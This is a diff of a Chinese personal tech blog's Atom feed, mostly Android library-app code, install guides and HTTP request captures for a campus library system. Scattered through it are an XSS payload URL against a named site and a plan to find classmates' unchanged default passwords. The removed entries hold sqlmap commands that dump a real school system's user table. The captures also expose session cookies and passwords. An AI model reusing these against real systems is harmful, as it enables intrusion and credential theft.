+            .getM_PUBLISHER());
+    listItemView.tv_m_year.setText(listItems.get(position).getM_PUB_YEAR());
+
+    return convertView;
+}
+</code></pre>
+
+<p>}</p>
+
+<h3>0x04 创建activity类将数据放进adapter中</h3>
+
+<pre><code>import java.io.UnsupportedEncodingException;
+import java.net.URLEncoder;
+import java.util.ArrayList;
+import java.util.List;
+
+import org.json.JSONObject;
+
+
+import android.os.Bundle;
+import android.os.Handler;
+import android.os.Message;
+import android.view.LayoutInflater;
+import android.view.View;
+import android.view.View.OnClickListener;
+import android.widget.Button;
+import android.widget.EditText;
+import android.widget.ListView;
+import gabriel.luoyer.promonkey.R;
+import gabriel.luoyer.promonkey.adapter.JianSuo_Adapter;
+import gabriel.luoyer.promonkey.base.BaseActivity;
+import gabriel.luoyer.promonkey.bean.LIB.LIB_book;
+import gabriel.luoyer.promonkey.bean.LIB.util.HttpClient_Bean_K;
+import gabriel.luoyer.promonkey.utils.HttpClient_Util_K;
+import gabriel.luoyer.promonkey.utils.NumericCharacterReference;
+
+public class JianSuo_activity extends BaseActivity {
+
+private ListView listView;
+private EditText et_jiansuo;
+private Button bt_jiansuo;
+private JianSuo_Adapter jiansuo_adapter;
+public LayoutInflater mInflater;
+public JSONObject json;
+private HttpClient_Bean_K hcbk_lend_lst;
+private List&lt;String&gt; ls_lst_two_params = new ArrayList&lt;String&gt;();
+private JianSuo_Adapter jianSuo_Adapter;
+private List&lt;LIB_book&gt; llb;
+private HttpClient_Bean_K hcbk_bl_jiansuo;
+
+@Override
+protected void onCreate(Bundle savedInstanceState) {
+    super.onCreate(savedInstanceState);
+    setContentView(R.layout.activity_jiansuo);
+
+    initViews();
+    initEvents();
+}
+
+@Override
+protected void initViews() {
+    listView = (ListView) this.findViewById(R.id.lv_jiansuo);
+    et_jiansuo = (EditText) this.findViewById(R.id.et_jiansuo);
+    bt_jiansuo = (Button) this.findViewById(R.id.bt_jiansuo);
+}
+
+@Override
+protected void initEvents() {
+    bt_jiansuo.setOnClickListener(new OnClickListener() {
+
+        @Override
+        public void onClick(View arg0) {
+            if(!et_jiansuo.getText().toString().isEmpty()){
+                Thread jianSuo_Book_thread = new Thread(new JianSuo_Book_thread());
+                jianSuo_Book_thread.start();
+            }
+
+        }
+
+    });
+
+}
+
+class JianSuo_Book_thread implements Runnable {
+
+    @Override
+    public void run() {
+
+        /*
+         * 先写成 每次访问都要登陆 因为第一次访问为未登陆 不知道为何返回码不为302 而是200 //访问lst //Header []
+         * header_android ={new
+         * Header("Set-Cookie",sharedata.getString("Set-Cookie", null))};
+         * hcbk_lend_lst = HttpClient_Util_K .http_Client_Get_Web(
+         * "http://121.193.129.2:8080/reader/book_lst.php", null, null,
+         * null);
+         * System.out.println("hcbk_lend_lst 第一次发送未还书籍记录 返回码为 :  "+hcbk_lend_lst
+         * .getStatusCode() );
+         */
+
+        String jiansuo = "";
+        try {
+            jiansuo = URLEncoder.encode(et_jiansuo.getText()+"", "UTF-8");
+        } catch (UnsupportedEncodingException e) {
+            e.printStackTrace();
+        }
+        // 获取检索书籍
+        org.apache.commons.httpclient.NameValuePair[] data_jiansuo = {
+                new org.apache.commons.httpclient.NameValuePair(
+                        "strSearchType", "title"),
+                new org.apache.commons.httpclient.NameValuePair(
+                        "match_flag", "any"),
+                new org.apache.commons.httpclient.NameValuePair(
+                        "historyCount", "1"),
+                new org.apache.commons.httpclient.NameValuePair("strText",
+                        jiansuo),
+                new org.apache.commons.httpclient.NameValuePair("doctype",
+                        "ALL"),
+                new org.apache.commons.httpclient.NameValuePair(
+                        "with_ebook", "on"),
+                new org.apache.commons.httpclient.NameValuePair(
+                        "displaypg", "20"),
+                new org.apache.commons.httpclient.NameValuePair("showmode",
+                        "list"),
+                new org.apache.commons.httpclient.NameValuePair("sort",
+                        "CATA_DATE"),
+                new org.apache.commons.httpclient.NameValuePair("orderby",
+                        "desc"),
+                new org.apache.commons.httpclient.NameValuePair("location",
+                        "ALL") };
+         hcbk_bl_jiansuo = HttpClient_Util_K
+                .http_Client_Get_Web(
+                        "http://121.193.129.2:8080/opac/openlink.php",
+                        data_jiansuo, null, null);
+
+        Message msg = queryMaxhandler.obtainMessage();
+        msg.what = 0;
+        queryMaxhandler.sendMessage(msg);
+    }
+
+}
+
+// Handler
+Handler queryMaxhandler = new Handler() {
+    public void handleMessage(Message msg) {
+        switch (msg.what) {
+        case 0:
+            llb =new ArrayList&lt;LIB_book&gt;();
+            int fromIndex = hcbk_bl_jiansuo.getWebContent().indexOf("&lt;h3&gt;");
+            int num = 0;
+            while (fromIndex != -1) {
+                LIB_book lb_item = new LIB_book();
+                num++;
+                // 获取m_title 开始以&amp;#X 结束以&lt;/a&gt;
+                int m_title_start = hcbk_bl_jiansuo.getWebContent().indexOf("&amp;#x",
+                        fromIndex);
+                int m_title_end = hcbk_bl_jiansuo.getWebContent().indexOf("&lt;/a&gt;",
+                        m_title_start);
+                String m_title = hcbk_bl_jiansuo.getWebContent().substring(
+                        m_title_start, m_title_end);
+                System.out.print(num + ":"
+                        + NumericCharacterReference.decode(m_title, '!'));
+
+                lb_item.setM_TITLE(NumericCharacterReference.decode(m_title, '!'));
+                // 获取索引号 
+                int m_call_no_end =hcbk_bl_jiansuo.getWebContent().indexOf("&lt;/h3&gt;", m_title_end);
+                //+5为了去掉&lt;/a&gt;
+                System.out.print("  索引号 :"+NumericCharacterReference.decode(hcbk_bl_jiansuo.getWebContent().substring(m_title_end+5, m_call_no_end).trim(),'!'));
+                lb_item.setCALL_NO(NumericCharacterReference.decode(hcbk_bl_jiansuo.getWebContent().substring(m_title_end+5, m_call_no_end).trim(),'!'));
+                //获取馆藏副本 +5为了去掉馆藏副本 :
+                int guanchang_start =hcbk_bl_jiansuo.getWebContent().indexOf("馆藏复本：",m_call_no_end);
+                int guanchang_end =hcbk_bl_jiansuo.getWebContent().indexOf("&lt;br&gt;",guanchang_start);
+                System.out.print("   馆藏副本 :"+NumericCharacterReference.decode(hcbk_bl_jiansuo.getWebContent().substring(guanchang_start+5,guanchang_end).trim(), '!'));
+                lb_item.setGuanChang(Integer.parseInt(NumericCharacterReference.decode(hcbk_bl_jiansuo.getWebContent().substring(guanchang_start+5,guanchang_end).trim(), '!')));
+                //获取可借副本
+                int kejie_start =hcbk_bl_jiansuo.getWebContent().indexOf("可借复本：",guanchang_end);
+                int kejie_end =hcbk_bl_jiansuo.getWebContent().indexOf("&lt;/span&gt;",kejie_start);
+                System.out.print("   可借副本 :"+NumericCharacterReference.decode(hcbk_bl_jiansuo.getWebContent().substring(kejie_start+5,kejie_end).trim(), '!'));
+                lb_item.setKeJie(Integer.parseInt(NumericCharacterReference.decode(hcbk_bl_jiansuo.getWebContent().substring(kejie_start+5,kejie_end).trim(), '!')));
+                //获取责任者
+                int m_author_start =hcbk_bl_jiansuo.getWebContent().indexOf("&lt;/span&gt;",kejie_end);
+                int m_author_end =hcbk_bl_jiansuo.getWebContent().indexOf("&lt;br /&gt;",m_author_start);
+                System.out.print("   责任者 :"+NumericCharacterReference.decode(hcbk_bl_jiansuo.getWebContent().substring(m_author_start+7,m_author_end).trim(), '!'));
+                lb_item.setM_AUTHOR(NumericCharacterReference.decode(hcbk_bl_jiansuo.getWebContent().substring(m_author_start+7,m_author_end).trim(), '!'));
+                //出版社和年份
+                int m_publisher_year_start =hcbk_bl_jiansuo.getWebContent().indexOf("&lt;br /&gt;",m_author_end);
+                //+6为了躲开开始时的&lt;br /&gt;
+                int m_publisher_year_end =hcbk_bl_jiansuo.getWebContent().indexOf("&lt;br /&gt;",m_publisher_year_start+6);
+                //System.out.println("start " +m_publisher_year_start +"end "+m_publisher_year_end);
+                //System.out.println(NumericCharacterReference.decode(hcbk_bl_jiansuo.getWebContent().substring(m_publisher_year_start+6,m_publisher_year_end).trim(),'!'));
+                String[] m_publisher_year = NumericCharacterReference.decode(hcbk_bl_jiansuo.getWebContent().substring(m_publisher_year_start+6,m_publisher_year_end).trim(),'!').split("&amp;nbsp;");
+
+                System.out.println("   出版社 :"+m_publisher_year[0]+"  年份 :  "+m_publisher_year[1]);
+                lb_item.setM_PUBLISHER(m_publisher_year[0]);
+                lb_item.setM_PUB_YEAR(m_publisher_year[1]);
+                fromIndex = hcbk_bl_jiansuo.getWebContent().indexOf("&lt;h3&gt;",
+                        m_publisher_year_end);
+                llb.add(lb_item);
+            }
+            jiansuo_adapter = new JianSuo_Adapter(JianSuo_activity.this, llb); //创建适配器  
+                listView.setAdapter(jiansuo_adapter);  
+            break;
+
+        }
+
+    }
+};
+
+}
+</code></pre>
+
+<h3>0x05 参考链接</h3>
+
+<p><a href="http://www.jb51.net/article/37236.htm">http://www.jb51.net/article/37236.htm</a></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[ sql server 2008 安装]]></title>
+    <link href="http://mzkmzk.github.io/blog/2015/05/18/sqlserver_install/"/>
+    <updated>2015-05-18T08:22:40+08:00</updated>
+    <id>http://mzkmzk.github.io/blog/2015/05/18/sqlserver_install</id>
+    <content type="html"><![CDATA[<!--more-->
+
+
+<h3>0x00下载地址</h3>
+
+<p><a href="http://blog.sina.com.cn/s/blog_4aedf6370101j9tz.html">http://blog.sina.com.cn/s/blog_4aedf6370101j9tz.html</a></p>
+
+<h3>0x01安装</h3>
+
+<p>解压完成后 点击 setup.exe</p>
+
+<p>然后</p>
+
+<p><img src="http://mzkmzk.github.io/images/blog/2015-05-19-01.png" alt="image" /></p>
+
+<p><img src="http://mzkmzk.github.io/images/blog/2015-05-19-02.png" alt="image" /></p>
+
+<p>如果在这次自己填写账号密码的话 就会报错 要改为NO AUTHORITY SYSTEM的 另外一个选项未尝试
+<img src="http://mzkmzk.github.io/images/blog/2015-05-19-03.png" alt="image" /></p>
+
+<p><img src="http://mzkmzk.github.io/images/blog/2015-05-19-04.png" alt="image" /></p>
+
+<p><img src="http://mzkmzk.github.io/images/blog/2015-05-19-05.png" alt="image" /></p>
+
+<p><img src="http://mzkmzk.github.io/images/blog/2015-05-19-06.png" alt="image" /></p>
+
+<h3>0X02 安装完后开始导入数据库</h3>
+
+<p><img src="http://mzkmzk.github.io/images/blog/2015-05-19-07.png" alt="image" /></p>
+
+<p>先选择sqlserver management  studio</p>
+
+<p>然后右击数据库附加 选中mdf即可</p>
+
+<h3>0x03 java程序连接数据库</h3>
+
+<p>先查看一下数据库的占用端口</p>
+
+<p>记得启用Tcp/IP连接和 在里面属性查看端口</p>
+
+<p><img src="http://mzkmzk.github.io/images/blog/2015-05-19-08.png" alt="image" /></p>
+
+<p>java连接代码 注意之前要添加驱动包</p>
+
+<pre><code>import java.sql.Connection;
+import java.sql.DriverManager;
+import java.sql.ResultSet;
+import java.sql.Statement;
+
+public class Test_connect_sqlserver {
+public static void main(String args[]){
+ String driverName = "com.microsoft.jdbc.sqlserver.SQLServerDriver"; // 加载JDBC驱动
+ String dbURL = "jdbc:microsoft:sqlserver://192.168.188.128:1433;databasename=jspesf"; 
+ String userName = "sa"; // 用户名
+ String userPwd = "1234"; // 密码
+
+ try {
+     // 加载SQLSERVER JDBC驱动程序
+     System.out.println("1");
+     Class.forName(driverName);
+     System.out.println("2");
+     //建立数据库连接
+     Connection connect = DriverManager.getConnection(dbURL, userName,userPwd);
+     System.out.println("3");
+     Statement stmt = connect.createStatement();
+     System.out.println("开始查询之前");
+     ResultSet rs = stmt.executeQuery("select * from dbo.admin;");
+     System.out.println("查询结束");
+     while (rs.next()) {
+         System.out.println(rs.getString("username"));
+     }
+ } catch (ClassNotFoundException e) {
+     System.out.print("Error loading SQLServer Driver!");
+     e.printStackTrace();
+ } catch (Exception e) {
+     System.out.print("get data error!");
+     e.printStackTrace();
+ }
+}
+}
+</code></pre>
+
+<h3>参考链接</h3>
+
+<p>安装sqlserver<a href="http://www.downcc.com/tech/4135.html">http://www.downcc.com/tech/4135.html</a>
+查看端口<a href="http://www.cnblogs.com/xwdreamer/archive/2012/06/23/2559344.html">http://www.cnblogs.com/xwdreamer/archive/2012/06/23/2559344.html</a></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Android_Studio 安装]]></title>
+    <link href="http://mzkmzk.github.io/blog/2015/05/18/Android_studio_install/"/>
+    <updated>2015-05-18T08:22:40+08:00</updated>
+    <id>http://mzkmzk.github.io/blog/2015/05/18/Android_studio_install</id>
+    <content type="html"><![CDATA[<!--more-->
+
+
+<h3>0x00下载</h3>
+
+<p><a href="http://pan.baidu.com/s/1qWyS1Z2">http://pan.baidu.com/s/1qWyS1Z2</a> 密码2cvh</p>
+
+<h3>0x01安装</h3>
+
+<p>开始安装时遇到报错</p>
+
+<pre><code>android studio was unable to find a valid jvm
+</code></pre>
+
+<p>解决方案</p>
+
+<ol>
+<li>显示安装文件包内容</li>
+<li><p>修改Info.plist</p>
+
+<pre><code> //将1.6*改成你的jvm版本
+ &lt;key&gt;JVMVersion&lt;/key&gt;
+ &lt;string&gt;1.6*&lt;/string&gt;
+ &lt;key&gt;MainClass&lt;/key&gt;
+
+ &lt;string&gt;com.intellij.idea.Main&lt;/string&gt;
+ &lt;key&gt;Properties&lt;/key&gt;
+</code></pre></li>
+</ol>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[tjrac_lib 请求状态记录]]></title>
+    <link href="http://mzkmzk.github.io/blog/2015/05/09/httpclient_tjraclib/"/>
+    <updated>2015-05-09T11:37:40+08:00</updated>
+    <id>http://mzkmzk.github.io/blog/2015/05/09/httpclient_tjraclib</id>
+    <content type="html"><![CDATA[<!--more-->
+
+
+<h3>读者推购</h3>
+
+<p>request 302</p>
+
+<pre><code>GET 
+/asord/asord_redr.php?click_type=commit&amp;title=%E4%BD%A0%E5%BF%85%E9%A1%BB%E7%9F%A5%E9%81%93%E7%9A%84222%E4%B8%AAC%2B%2B%E8%AF%AD%E8%A8%80%E9%97%AE%E9%A2%98&amp;a_name=%E6%9D%8E%E4%B8%96%E6%AC%A3&amp;b_pub=%E4%BA%BA%E6%B0%91%E9%82%AE%E7%94%B5%E5%87%BA%E7%89%88%E7%A4%BE&amp;b_date=2010-6&amp;b_type=C&amp;b_isbn=9787115224965&amp;b_remark= HTTP/1.1
+Host: 121.193.129.2:8080
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:37.0) Gecko/20100101 Firefox/37.0
+Accept: text/html,application/xhtml xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://121.193.129.2:8080/asord/asord_redr.php?click_type=douban&amp;title=222&amp;a_name=&amp;b_pub=&amp;b_date=&amp;b_type=C&amp;b_isbn=&amp;b_remark=
+Cookie: TimeSelf=394348; PHPSESSID=dio52e3ql0de367g3nlnh43v42
+Connection: keep-alive
+</code></pre>
+
+<p>response 302</p>
+
+<pre><code>request:
+GET /asord/asord_redr_con.php?b_name=你必须知道的222个C++语言问题&amp;a_name=李世欣&amp;b_type=C&amp;b_pub=人民邮电出版社&amp;b_date=2010-6&amp;b_isbn=9787115224965 HTTP/1.1
+Host: 121.193.129.2:8080
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:37.0) Gecko/20100101 Firefox/37.0
+Accept: text/html,application/xhtml xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://121.193.129.2:8080/asord/asord_redr.php?click_type=douban&amp;title=222&amp;a_name=&amp;b_pub=&amp;b_date=&amp;b_type=C&amp;b_isbn=&amp;b_remark=
+Cookie: TimeSelf=394348; PHPSESSID=dio52e3ql0de367g3nlnh43v42
+Connection: keep-alive
+</code></pre>
+
+<p>request 200</p>
+
+<pre><code>request
+GET
+/asord/asord_redr_result.php?msg=  荐购成功，感谢您参与我们的馆藏建设！&lt;br /&gt;&lt;br /&gt;  我们会通过Email及时通知你所荐购书刊的处理情况。&lt;br /&gt;&lt;br /&gt;  您也可以通过我的图书馆中的荐购历史查看您所荐购图书的处理情况。&amp;retUrl=asord_redr.php HTTP/1.1
+Host: 121.193.129.2:8080
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:37.0) Gecko/20100101 Firefox/37.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://121.193.129.2:8080/asord/asord_redr.php?click_type=douban&amp;title=222&amp;a_name=&amp;b_pub=&amp;b_date=&amp;b_type=C&amp;b_isbn=&amp;b_remark=
+Cookie: TimeSelf=394348; PHPSESSID=dio52e3ql0de367g3nlnh43v42
+Connection: keep-alive
+</code></pre>
+
+<h3>读者挂失</h3>
+
+<p>request</p>
+
+<pre><code>POST /reader/redr_lost_result.php HTTP/1.1
+Host: 121.193.129.2:8080
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:37.0) Gecko/20100101 Firefox/37.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://121.193.129.2:8080/reader/redr_lost.php
+Cookie: TimeSelf=394348; PHPSESSID=dio52e3ql0de367g3nlnh43v42
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 19
+
+loss_pwd=6011203156
+</code></pre>
+
+<p>response</p>
+
+<pre><code>HTTP/1.1 200 OK
+Date: Sat, 09 May 2015 08:57:04 GMT
+Server: Apache/2.2.22 (Win32) PHP/5.2.17
+X-Powered-By: PHP/5.2.17
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 3831
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html
+
+网页包含关键字挂失成功 or
+密码输入错误,请重新登陆 !
+</code></pre>
+
+<h3>修改密码</h3>
+
+<p>request</p>
+
+<pre><code>POST /reader/change_passwd_result.php HTTP/1.1
+Host: 121.193.129.2:8080
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:37.0) Gecko/20100101 Firefox/37.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://121.193.129.2:8080/reader/change_passwd.php
+Cookie: TimeSelf=394348;        PHPSESSID=dio52e3ql0de367g3nlnh43v42
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 84
+
+old_passwd=6011203157&amp;new_passwd=554737&amp;chk_passwd=554737&amp;submit1=%E7%A1%AE%E5%AE%9A
+</code></pre>
+
+<p>response</p>
+
+<pre><code>HTTP/1.1 200 OK
+Date: Sat, 09 May 2015 09:30:33 GMT
+Server: Apache/2.2.22 (Win32) PHP/5.2.17
+X-Powered-By: PHP/5.2.17
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 3837
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html
+</code></pre>
+
+<h3>续借</h3>
+
+<pre><code>GET /reader/ajax_renew.php?bar_code=RA0527003&amp;check=2DB778E6&amp;time=1430726027035 HTTP/1.1
+Host: 121.193.129.2:8080
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:35.0) Gecko/20100101 Firefox/35.0
+Accept: text/html, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Referer: http://121.193.129.2:8080/reader/book_lst.php
+Cookie: TimeSelf=393309; PHPSESSID=qd7titnifvmpstu5eg1l3fj954
+Connection: keep-alive
+
+
+GET /reader/ajax_renew.php?bar_code=RA0527003&amp;check=2DB778E6&amp;time=1430726095058 HTTP/1.1
+Host: 121.193.129.2:8080
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:35.0) Gecko/20100101 Firefox/35.0
+Accept: text/html, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Referer: http://121.193.129.2:8080/reader/book_lst.php
+Cookie: TimeSelf=393309; PHPSESSID=qd7titnifvmpstu5eg1l3fj954
+Connection: keep-alive
+</code></pre>
+
+<p>包含关键字 旧密码输入有误
+         or 您的密码修改成功,请重新登陆</p>
+
+<p>urlconde转码参考
+<a href="http://blog.csdn.net/zhh521125/article/details/6627245">http://blog.csdn.net/zhh521125/article/details/6627245</a></p>
+
+<p>下拉参考 <a href="http://imshare.iteye.com/blog/770950">http://imshare.iteye.com/blog/770950</a></p>
+
+<p>密码修改 第二次 程序奔溃
+原因应该是 修改完的密码 没有给 shara 修改完成</p>
+
+<p>推荐购买 功能实现但返回码为空</p>
+
+<p>用原来model的办法 会乱码</p>
+
+<p>出现HTML代码，一闪就过，再运行就停止了</p>
+
+<p>挂失问题 挂失了以后不再显示 输入密码</p>
+
+<p>推荐国脉获取的response的webconte为空 原因是经过了两次302跳转 先都以建构成功返回</p>
+
+<p>搜索功能出错
+    at com.tjrac.adapter.Czsj_Adapter.getCount(Czsj_Adapter.java:39)空指针</p>
+
+<p>多次按挂失 报错Login</p>
+
+<h3>搜索书籍的图片</h3>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[android 小技能]]></title>
+    <link href="http://mzkmzk.github.io/blog/2015/05/09/android_little_skill/"/>
+    <updated>2015-05-09T11:37:40+08:00</updated>
+    <id>http://mzkmzk.github.io/blog/2015/05/09/android_little_skill</id>
+    <content type="html"><![CDATA[<!--more-->
+
+
+<h3>0x00 去掉顶部自带栏</h3>
+
+<pre><code>public class MainActivity extends Activity {  
+
+@Override  
+protected void onCreate(Bundle savedInstanceState) {  
+    super.onCreate(savedInstanceState);  
+    //这句就是去掉程序的title  
+    requestWindowFeature(Window.FEATURE_NO_TITLE);  
+    setContentView(R.layout.activity_main);  
+}  
+}  
+</code></pre>
+
+<p>参考链接<a href="http://blog.csdn.net/kaypro/article/details/9858807">http://blog.csdn.net/kaypro/article/details/9858807</a></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Linux常用命令]]></title>
+    <link href="http://mzkmzk.github.io/blog/2015/05/08/Linux_Order/"/>
+    <updated>2015-05-08T11:40:40+08:00</updated>
+    <id>http://mzkmzk.github.io/blog/2015/05/08/Linux_Order</id>
+    <content type="html"><![CDATA[<!--more-->
+
+
+<h3>Linux装逼命令</h3>
+
+<pre><code>cat /dev/urandom | hexdump -C | grep "ca fe" 
+</code></pre>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Temporary_question]]></title>
+    <link href="http://mzkmzk.github.io/blog/2015/05/05/temporary_question/"/>
+    <updated>2015-05-05T00:00:00+08:00</updated>
+    <id>http://mzkmzk.github.io/blog/2015/05/05/temporary_question</id>
+    <content type="html"><![CDATA[<p>layout: post
+title: &ldquo;临时保留问题&rdquo;
+date: 2015-05-04 21:28:46 +0800
+comments: true</p>
+
+<h2>categories: question </h2>
+
+<!--more-->
+
+
+<h3>虚拟机无法ping通外网</h3>
+
+<pre><code>[root@linux5 ~]# ping 168.254.98.202
+connect: 网络不可达
+</code></pre>
+
+<h3>不错的博客</h3>
+
+<p><a href="http://songtl.com/">http://songtl.com/</a></p>
+
+<h3>Eclipse反编译插件</h3>
+
+<p><a href="http://jd.benow.ca/">http://jd.benow.ca/</a></p>
+
+<h3>设置代理 获取iPhone的网络</h3>
+
+<h3>写一个httpclient 获取 所有密码没改的同学</h3>
+
+<h3>程序获取android网络通信</h3>
+
+<h2>设置格式化 最大长度条件</h2>
+
+<h3>loveniwed xxs利用</h3>
+
+<p><a href="http://loveniwed.com/queryReportAction?ntype=professor%22%3E%3Cscript%3Ealert%2842873%29%3C%2Fscript%3E">http://loveniwed.com/queryReportAction?ntype=professor%22%3E%3Cscript%3Ealert%2842873%29%3C%2Fscript%3E</a></p>
+
+<p>In this paper, the author gives a personal view on the current development direction of smart home, </p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Linux 常用命令]]></title>
+    <link href="http://mzkmzk.github.io/blog/2015/05/04/Linux_Order/"/>
+    <updated>2015-05-04T21:28:46+08:00</updated>
+    <id>http://mzkmzk.github.io/blog/2015/05/04/Linux_Order</id>
+    <content type="html"><![CDATA[<!--more-->
+
+
+<h3>sheel相关</h3>
+
+<pre><code>#set        查看所有变量
+#export     查看所有环境变量
+#printenv   查看所有环境变量
+</code></pre>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[hack思路]]></title>
@@ -52,1081 +3340,6 @@
 zm
 123
 报错</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[sqlmap渗透某系统过程]]></title>
-    <link href="http://mzkmzk.github.io/blog/2015/04/30/rac_permeate.markdwon/"/>
-    <updated>2015-04-30T11:37:40+08:00</updated>
-    <id>http://mzkmzk.github.io/blog/2015/04/30/rac_permeate.markdwon</id>
-    <content type="html"><![CDATA[<!--more-->
-
-
-<p>主要通过<code>sqlmap</code>进行渗透</p>
-
-<h3>0x00 找到注入点</h3>
-
-<p>如图<a href="15-02-15-01">link</a></p>
-
-<p>通过<code>burpsuite</code>获取此系统中某处的搜索功能 中的信息 然后保存到txt中</p>
-
-<pre><code>python sqlmap.py -r /Users/~/Desktop/injection6.txt
-</code></pre>
-
-<p>然后获取到注入点</p>
-
-<p><a href="15-02-15-02">link</a></p>
-
-<h3>0x02 查询数据库表</h3>
-
-<pre><code>python sqlmap.py -r /Users/~/Desktop/injection6.txt  -p searchKeyword  --tables --exclude-sysdbs 
-</code></pre>
-
-<p><a href="15-02-15-03">link</a></p>
-
-<h3>0x03 渗透步骤</h3>
-
-<p>这可以获取数据库和数据库表
-    python ~/Learning/Hack/sqlmap/sqlmap_new/sqlmap/sqlmap.py -r  ~/Desktop/hackTJRAC_BM.txt  -p tb_QueryText &ndash;tables &ndash;exclude-sysdbs &ndash;columns ,-C,-T,-D &ndash;dump -T vUsers</p>
-
-<h3>参考链接</h3>
-
-<p>sqlmap使用参考手册<a href="http://drops.wooyun.org/tips/143">http://drops.wooyun.org/tips/143</a></p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[抓站下载工具 Mac Httracl]]></title>
-    <link href="http://mzkmzk.github.io/blog/2015/04/30/download_website/"/>
-    <updated>2015-04-30T11:37:40+08:00</updated>
-    <id>http://mzkmzk.github.io/blog/2015/04/30/download_website</id>
-    <content type="html"><![CDATA[<!--more-->
-
-
-<h3>0x00下载地址<a href="https://www.httrack.com/page/2/en/index.html">https://www.httrack.com/page/2/en/index.html</a></h3>
-
-<h3>0x01运行</h3>
-
-<p>终端输入<code>/Users/maizhikun/Learning/Hack/httrack/Mac/httrack-3.48.21/src/httrack</code></p>
-
-<pre><code>Welcome to HTTrack Website Copier (Offline Browser) 3.48-21
-Copyright (C) 1998-2015 Xavier Roche and other contributors
-To see the option list, enter a blank line or try httrack --help
-
-#输入项目名
-Enter project name :Text
-#输入文件存放路径
-Base path (return=/Users/maizhikun/websites/) :/Users/maizhikun/Learning/Hack/httrack/workspace/
-#输入要抓取的网址
-Enter URLs (separated by commas or blank spaces) :loveniwed.com
-
-Action:
-#默认的下载方式
-(enter) 1   Mirror Web Site(s)
-#默认的下载方式和所提question中所有的有可能下载的所有链接
-2   Mirror Web Site(s) with Wizard
-#会只下载制定的文件,但不会包括爬虫文件
-3   Just Get Files Indicated
-#下载网站中所有的链接
-4   Mirror ALL links in URLs (Multiple Mirror)
-#所有的链接都会变成书签
-5   Test Links In URLs (Bookmark Test)
-0   Quit
-: 1
-
-Proxy (return=none) :
-
-You can define wildcards, like: -*.gif +www.*.com/*.zip -*img_*.zip
-Wildcards (return=none) :
-
-You can define additional options, such as recurse level (-r&lt;number&gt;), separed by blank spaces
-To see the option list, type help
-Additional options (return=none) :
-
----&gt; Wizard command line: httrack loveniwed.com  -O "/Users/maizhikun/Learning/Hack/httrack/workspace/Text"  -%v  
-
-Ready to launch the mirror? (Y/n) :y
-
-Mirror launched on Wed, 01 Apr 2015 18:21:25 by HTTrack Website Copier/3.48-21 [XR&amp;CO'2014]
-mirroring loveniwed.com with the wizard help..
-
-
-
-* loveniwed.com/up/Report3341北京城里最大的户外公园婚礼堂,您的专属婚礼殿堂！19.j* loveniwed.com/up/Report2701北京国贸大酒店“爱在云端Love In * loveniwed.co696/707: loveniwed.com/up/Report2111电影《完美嫁衣》发布会24.jpg (35952 bytesDone.08: loveniwed.com/sanya0.html (2050 bytes) - 500
-Thanks for using HTTrack!
-* 
-logout
-
-[进程已完成]
-</code></pre>
-
-<h3>网站方式</h3>
-
-<p>执行<code>~/httrack/src/webhttrack</code>可以在网页版中抓站</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[tjrac_lib响应式设计初稿]]></title>
-    <link href="http://mzkmzk.github.io/blog/2015/04/28/tjraclibwebresponsive/"/>
-    <updated>2015-04-28T11:37:40+08:00</updated>
-    <id>http://mzkmzk.github.io/blog/2015/04/28/tjraclibwebresponsive</id>
-    <content type="html"><![CDATA[<!--more-->
-
-
-<h3>参考链接</h3>
-
-<p><a href="http://www.ruanyifeng.com/blog/2012/05/responsive_web_design.html">http://www.ruanyifeng.com/blog/2012/05/responsive_web_design.html</a></p>
-]]></content>
-  </entry>
-  
-  <entry>
